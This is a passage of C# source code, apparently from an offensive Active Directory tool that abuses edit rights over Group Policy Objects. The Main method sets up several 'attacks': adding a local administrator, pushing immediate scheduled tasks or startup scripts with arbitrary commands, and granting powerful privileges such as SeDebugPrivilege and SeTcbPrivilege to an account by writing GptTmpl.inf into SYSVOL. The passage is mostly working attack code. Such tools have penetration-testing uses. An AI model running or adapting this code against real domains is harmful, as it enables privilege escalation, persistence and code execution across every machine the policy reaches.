        public static void AddNewRights(String Domain, String DomainController, String GPOName, String distinguished_name, String[] new_rights, String UserAccount)
        {
            // Get SID of user who will be local admin
            System.DirectoryServices.AccountManagement.PrincipalContext ctx = new System.DirectoryServices.AccountManagement.PrincipalContext(System.DirectoryServices.AccountManagement.ContextType.Domain, DomainController);
            System.DirectoryServices.AccountManagement.UserPrincipal usr = null;
            try
            {
                usr = System.DirectoryServices.AccountManagement.UserPrincipal.FindByIdentity(ctx, System.DirectoryServices.AccountManagement.IdentityType.SamAccountName, UserAccount);
                Console.WriteLine("[+] SID Value of " + UserAccount + " = " + usr.Sid.Value);
            }
            catch
            {
                Console.WriteLine("[-] Could not find user \"" + UserAccount + "\" in the " + Domain + " domain.\n[-] Exiting...\n");
                System.Environment.Exit(0);
            }

            String GPOGuid = GetGPOGUID(DomainController, GPOName, distinguished_name);

            string text = @"[Unicode]
Unicode=yes
[Version]
signature=""$CHICAGO$""
Revision = 1
[Privilege Rights]";

            String right_lines = null;
            foreach (String right in new_rights)
            {
                text += Environment.NewLine + right + " = *" + usr.Sid.Value;
                right_lines += right + " = *" + usr.Sid.Value + Environment.NewLine;
            }

            String path = @"\\" + Domain + "\\SysVol\\" + Domain + "\\Policies\\" + GPOGuid;
            String GPT_path = path + "\\GPT.ini";

            // Check if GPO path exists
            if (Directory.Exists(path))
            {
                path += "\\Machine\\Microsoft\\Windows NT\\SecEdit\\";
            }
            else
            {
                Console.WriteLine("[!] Could not find the specified GPO!\nExiting...");
                System.Environment.Exit(0);
            }

            // check if the folder structure for adding admin user exists in SYSVOL
            if (!Directory.Exists(path))
            {
                System.IO.Directory.CreateDirectory(path);
            }
            path += "GptTmpl.inf";
            if (File.Exists(path))
            {
                bool exists = false;
                Console.WriteLine("[+] File exists: " + path);
                string[] readText = File.ReadAllLines(path);

                foreach (string s in readText)
                {
                    // Check if memberships are defined via group policy
                    if (s.Contains("[Privilege Rights]"))
                    {
                        exists = true;
                    }
                }

                // if user rights are defined
                if (exists)
                {
                    // Curently there is no support for appending user rightsto exisitng ones
                    Console.WriteLine("[!] The GPO already specifies user rights. Select a different attack.\n[!] Exiting...");
                    System.Environment.Exit(0);
                }

                // if user rights are not defined
                if (!exists)
                {
                    Console.WriteLine("[+] The GPO does not specify any user rights. Adding new rights...");
                    using (System.IO.StreamWriter file2 = new System.IO.StreamWriter(path))
                    {
                        foreach (string l in readText)
                        {
                            file2.WriteLine(l);
                        }
                        file2.WriteLine("[Privilege Rights]" + Environment.NewLine + right_lines);
                    }
                    UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "AddNewRights", "Computer");
                }
            }
            else
            {
                Console.WriteLine("[+] Creating file " + path);
                System.IO.File.WriteAllText(path, text);
                UpdateVersion(Domain, distinguished_name, GPOName, GPT_path, "AddNewRights", "Computer");
            }
        }

        static void Main(string[] args)
        {

            if (args == null)
            {
                PrintHelp();
                return;
            }

            String[] user_rights_list = {
                "SeTrustedCredManAccessPrivilege",
                "SeNetworkLogonRight",
                "SeTcbPrivilege",
                "SeMachineAccountPrivilege",
                "SeIncreaseQuotaPrivilege",
                "SeInteractiveLogonRight",
                "SeRemoteInteractiveLogonRight",
                "SeBackupPrivilege",
                "SeChangeNotifyPrivilege",
                "SeSystemtimePrivilege",
                "SeTimeZonePrivilege",
                "SeCreatePagefilePrivilege",
                "SeCreateTokenPrivilege",
                "SeCreateGlobalPrivilege",
                "SeCreatePermanentPrivilege",
                "SeCreateSymbolicLinkPrivilege",
                "SeDebugPrivilege",
                "SeDenyNetworkLogonRight",
                "SeDenyBatchLogonRight",
                "SeDenyServiceLogonRight",
                "SeDenyInteractiveLogonRight",
                "SeDenyRemoteInteractiveLogonRight",
                "SeEnableDelegationPrivilege",
                "SeRemoteShutdownPrivilege",
                "SeAuditPrivilege",
                "SeImpersonatePrivilege",
                "SeIncreaseWorkingSetPrivilege",
                "SeIncreaseBasePriorityPrivilege",
                "SeLoadDriverPrivilege",
                "SeLockMemoryPrivilege",
                "SeBatchLogonRight",
                "SeServiceLogonRight",
                "SeSecurityPrivilege",
                "SeRelabelPrivilege",
                "SeSystemEnvironmentPrivilege",
                "SeManageVolumePrivilege",
                "SeProfileSingleProcessPrivilege",
                "SeSystemProfilePrivilege",
                "SeUndockPrivilege",
                "SeAssignPrimaryTokenPrivilege",
                "SeRestorePrivilege",
                "SeShutdownPrivilege",
                "SeSyncAgentPrivilege",
                "SeTakeOwnershipPrivilege"
            };

            bool Force = false;

            String Domain = "";
            String DomainController = "";
            String UserAccount = "";
            String GPOName = "";

            String task_name = "";
            String author = "";
            String arguments = "";
            String command = "";
            bool AddLocalAdmin = false;
            bool AddComputerTask = false;
            bool AddUserTask = false;

            String ScriptContents = "";
            String ScriptName = "";
            bool AddUserScript = false;
            bool AddComputerScript = false;

            bool AddUserRights = false;
            String[] user_rights = null;

            var Options = new Options();

            if (CommandLineParser.Default.ParseArguments(args, Options))
            {
                if (args.Length == 0)
                {
                    PrintHelp();
                    return;
                }

                if (Options.Help == true)
                {
                    PrintHelp();
                    return;
                }
                // check that only one attack was specified
                if ( !(Options.AddLocalAdmin ^ Options.AddUserRights ^ Options.AddUserScript ^ Options.AddComputerScript ^ Options.AddUserTask ^ Options.AddComputerTask) )
                {
                    Console.WriteLine("[!] You can only specify one attack at a time.\n[-] Exiting\n");
                    return;
                }

                //check that the name of the GPO to edit was provided
                if (string.IsNullOrEmpty(Options.GpoName))
                {
                    Console.Write("[!] You need to provide the name of the GPO to edit.\n[!] Exiting...\n");
                    return;
                }
                GPOName = Options.GpoName;

                // check that the necessary options for adding a new local admin were provided
                if (Options.AddLocalAdmin)
                {
                    AddLocalAdmin = true;
                    if (string.IsNullOrEmpty(Options.UserAccount))
                    {
                        Console.WriteLine("[!] To add a new local admin the following options are needed:\n\t--UserAccount\n\n[-] Exiting...");
                        return;
                    }
                    UserAccount = Options.UserAccount;
                }

                // check that the necessary options for adding a new startup script were provided
                if (Options.AddUserScript || Options.AddComputerScript)
                {
                    if (Options.AddUserScript)
                    {
                        AddUserScript = true;
                    }
                    else
                    {
                        AddComputerScript = true;
                    }

                    if (string.IsNullOrEmpty(Options.ScriptName))
                    {
                        Console.WriteLine("[!] To add a new startup script the following options are needed:\n\t--ScriptName\n\t--ScriptContents\n\n[-] Exiting...");
                        return;
                    }
                    if (string.IsNullOrEmpty(Options.ScriptContents))
                    {
                        Console.WriteLine("[!] To add a new startup script the following options are needed:\n\t--ScriptName\n\t--ScriptContents\n\n[-] Exiting...");
                        return;
                    }
                    ScriptContents = Options.ScriptContents;
                    ScriptName = Options.ScriptName;

                }

                //check that the necessary options for adding a new scheduled task were provided
                if (Options.AddComputerTask || Options.AddUserTask)
                {
                    if (Options.AddComputerTask)
                    {
                        AddComputerTask = true;
                    }
                    else
                    {
                        AddUserTask = true;
                    }
                    if (string.IsNullOrEmpty(Options.TaskName) || string.IsNullOrEmpty(Options.Author) || string.IsNullOrEmpty(Options.Arguments) || string.IsNullOrEmpty(Options.Command))
                    {
                        Console.WriteLine("[!] To add a new immediate task the following options are needed:\n\t--Author\n\t--TaskName\n\t--Arguments\n\t--Command\n\n[-] Exiting...");
                        return;
                    }
                    task_name = Options.TaskName;
                    author = Options.Author;
                    arguments = Options.Arguments;
                    command = Options.Command;
                }

                // check that the necessary options for adding new rights were provided
                if (Options.AddUserRights)
                {
                    AddUserRights = true;
                    if ((string.IsNullOrEmpty(Options.UserAccount)) || string.IsNullOrEmpty(Options.UserRights))
                    {
                        Console.WriteLine("[!] To add user rights the following options are needed:\n\t--UserAccount\n\t--UserRights\n[-] Exiting...");
                        return;
                    }

                    UserAccount = Options.UserAccount;
                    user_rights = Options.UserRights.Split(',');

                    // check if the rights passed as arguments are valid
                    foreach (string p in user_rights)
                    {
                        if (!user_rights_list.Contains(p))
                        {
                            Console.WriteLine("\n[!] The user rights provided were not valid. Rights are case sensitive!\n[!] Exiting...");
                            return;
                        }
                    }
                }

                if (!string.IsNullOrEmpty(Options.DomainController))
                {
                    DomainController = Options.DomainController;
                }
                if (!string.IsNullOrEmpty(Options.Domain))
                {
                    Domain = Options.Domain;
                }
                if (Options.Force)
                {
                    Force = true;
                }
            }
            else
            {
                Console.Write("[!] Unknown argument error.\n[!] Exiting...\n");
                return;
            }

            System.DirectoryServices.ActiveDirectory.Domain current_domain = null;
            if (string.IsNullOrEmpty(Domain))
            {
                try
                {
                    current_domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain();
                }
                catch
                {
                    Console.WriteLine("[!] Cannot enumerate domain.\n");
                    return;
                }
            }

            if (string.IsNullOrEmpty(DomainController))
            {
                DomainController = current_domain.PdcRoleOwner.Name;
            }

            if (string.IsNullOrEmpty(Domain))
            {
                Domain = current_domain.Name;
            }

            String[] DC_array = null;
            String distinguished_name = null;
            distinguished_name = "CN=Policies,CN=System";
            DC_array = Domain.Split('.');

            foreach (String DC in DC_array)
            {
                distinguished_name += ",DC=" + DC;
            }
            Domain = Domain.ToLower();

            Console.WriteLine("[+] Domain = " + Domain);
            Console.WriteLine("[+] Domain Controller = " + DomainController);
            Console.WriteLine("[+] Distinguished Name = " + distinguished_name);

            // Add new local admin
            if (AddLocalAdmin)
            {
                try
                {
                    NewLocalAdmin(UserAccount, Domain, DomainController, GPOName, distinguished_name, Force);
                }
                catch (System.Exception ex)
                {
                    Console.WriteLine(ex.Message + "[!] Exiting...");
                    return;
                }

            }

            // Add new scheduled task
            if (AddUserTask)
            {
                NewImmediateTask(Domain, DomainController, GPOName, distinguished_name, task_name, author, arguments, command, Force, "User");
            }

            if (AddComputerTask)
            {
                NewImmediateTask(Domain, DomainController, GPOName, distinguished_name, task_name, author, arguments, command, Force, "Computer");
            }

            // Add new startup script
            if (AddUserScript)
            {
                NewStartupScript(ScriptName, ScriptContents, Domain, DomainController, GPOName, distinguished_name, "User");
            }

            if (AddComputerScript)
            {
                NewStartupScript(ScriptName, ScriptContents, Domain, DomainController, GPOName, distinguished_name, "Computer");
            }

            // Add rights to user account
            if (AddUserRights)
            {
                AddNewRights(Domain, DomainController, GPOName, distinguished_name, user_rights, UserAccount);
            }
        }
    }
}